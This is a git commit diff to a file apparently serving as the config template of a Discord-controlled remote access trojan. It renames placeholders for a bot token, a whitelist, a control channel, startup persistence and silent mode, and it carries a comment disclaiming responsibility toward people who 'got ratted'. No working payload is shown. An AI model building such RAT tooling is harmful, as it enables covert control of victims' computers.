77063767127577ece3aafbb3c93b54019c8b95d1
vn4thyt <vns.on.ytbe@gmail.com>
2025-12-24 17:55:09 +0000

    Update and rename template2.py to template.py

--- Stuff/RAT/template.py
+++ Stuff/RAT/template.py
@@ -4,11 +4,12 @@
 
 # If you got ratted, and reversed engineered the file back here - Please note I take NO accountability for what others do with my projects. If you would like to know how to remove the rat and stay safe, please DM 'vn4th' on Discord.
 
-TOKEN = f"{token}"
-WHITELIST = [{whitelist}]
-main_channel = {main_channel}
-prefix = f"{prefix}"
-add_to_startup = {add_to_startup}
-silent_mode = {silent_mode}
+TOKEN = "{placeholder_token}"
+WHITELIST = [{placeholder_whitelist}]
+main_channel = {placeholder_main_channel}
+prefix = f"{placeholder_prefix}"
+add_to_startup = {placeholder_add_to_startup}
+silent_mode = {placeholder_silent_mode}
 
 print(TOKEN, WHITELIST, main_channel, prefix, add_to_startup, silent_mode)
+input("press anything to exit")
